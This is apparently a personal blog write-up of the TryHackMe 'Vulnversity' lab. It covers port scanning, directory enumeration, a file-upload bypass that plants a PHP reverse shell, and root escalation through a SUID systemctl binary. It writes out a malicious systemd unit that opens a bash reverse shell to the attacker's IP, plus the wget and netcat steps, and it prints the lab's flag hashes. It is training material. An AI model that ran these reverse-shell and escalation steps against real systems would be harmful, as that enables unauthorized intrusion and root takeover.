---
date: 4/8/2025 00:00
layout: post
title: Vulnversity
subtitle: Vulnversity for TyHackMe Writeup.
description: >-
  in this blog i've explained how to root Vulnversity from TryHackMe
image: https://tryhackme-images.s3.amazonaws.com/room-icons/85dee7ce633f5668b104d329da2769c3.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/85dee7ce633f5668b104d329da2769c3.png
category: tryhackme
tags:
  - tryhackme
  - injection
author: Mustafa Eltayeb
paginate: true
---


# Room Name [Vulnversity](https://tryhackme.com/room/vulnversity "Vulnversity")




This room [Vulnversity On TryHackMe] will cover active recon, web app attacks and escalate your privileges to root via an SUID binary.

----

# Objective of room

This room will cover 
1. active recon
2. web app attacks
3.  privilege escalation.

### AS always i start with nmap to scan for open ports and services in this machine.

>**nmap -sV 10.10.220.119**

### Result
```js
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Locating directories using Gobuster

>**gobuster dir -u http://10.10.220.119:3333 -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt**

```js
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.220.119:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.220.119:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.220.119:3333/js/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.220.119:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.220.119:3333/internal/]

```
We have some directories 
```js
/images
/css
/js
/fonts
/internal 
```
> Go to http://10.10.220.119:3333/internal/

#### I found This Page , that's we can upload files

![](/assets/TryHackMeRoomsImage/Vulnversity/image.png)

#### The web application is blocking certain file extensions during upload.I’ll use Burp Suite Intruder to fuzz the file extension field and enumerate the allowed extensions.

## create extension file

![](/assets/TryHackMeRoomsImage/Vulnversity/extention.png)
#### using Burip Suit to Fuzz
![](/assets/TryHackMeRoomsImage/Vulnversity/BurpSuit.png)


#### Uploading success in .phtml if you have an error disable url encode in burp


![](/assets/TryHackMeRoomsImage/Vulnversity/BurpResult.png)

#### Now I Will Use Pentest Monky php_shell after make it shell.phtml To Get reverse_shell

![](/assets/TryHackMeRoomsImage/Vulnversity/uploaded.png)

Gain Reverse Shell

>**nc -nlvp 1234**

```js
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ nc -nlvp 1234
Listening on 0.0.0.0 1234
```
#### go to http://10.10.220.119:3333/internal/uploads/shell.phtml to execute our shell
#### back to our listener
```js
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.220.119 46868
Linux ip-10-10-220-119 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 15:39:26 up  1:32,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
Move TO /home/bill and Get First Flag User.txt

$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

#### Time for some privilege escalation

SUID
(Set owner User ID up on execution) is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherits access permissions from the logged in user.

Use

>**find / -perm -u=s -type f 2>/dev/null**

to search for files with a misconfigured SUID let us to get root privileges
```js
$ find / -perm -u=s -type f 2>/dev/null   
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/mount
/bin/umount
/bin/systemctl
/bin/fusermount
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/core20/2582/usr/bin/chfn
/snap/core20/2582/usr/bin/chsh
/snap/core20/2582/usr/bin/gpasswd
/snap/core20/2582/usr/bin/mount
/snap/core20/2582/usr/bin/newgrp
/snap/core20/2582/usr/bin/passwd
/snap/core20/2582/usr/bin/su
/snap/core20/2582/usr/bin/sudo
/snap/core20/2582/usr/bin/umount
/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2582/usr/lib/openssh/ssh-keysign
/sbin/mount.cifs
$ 
```
#### The /bin/systemctl file looks intersest. 


> Target virtual machine can NOT run a text editor . Created - in attack vm - a file name root.service with the below content.

```js
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.11.139.85/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
1. save this file as root.service

2. make python server using python3 -m http.server

3. go to tmp folder in target machine



### use wget http://attack_ip:port/root.service

```js
$ wget http://10.11.139.85:3333/root.service
--2025-08-04 16:07:10--  http://10.11.139.85:3333/root.service
Connecting to 10.11.139.85:3333... connected.
HTTP request sent, awaiting response... 200 OK
Length: 163 [application/octet-stream]
Saving to: 'root.service'

     0K                                                       100% 47.0K=0.003s

2025-08-04 16:07:11 (47.0 KB/s) - 'root.service' saved [163/163]

$ 
```
Set up listner in port 9999 i chose port in root.service file

>**nc -nlvp 9999** 

in victim machine run

> systemctl enable /tmp/root.service

> systemctl start root

## Now we are root
```js
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ nc -nlvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.220.119 46164
bash: cannot set terminal process group (3010): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-220-119:/# 
Search for root flag
root@ip-10-10-220-119:/# cd root
cd root
root@ip-10-10-220-119:~# ls
ls
root.txt
snap
root@ip-10-10-220-119:~# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
```

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>
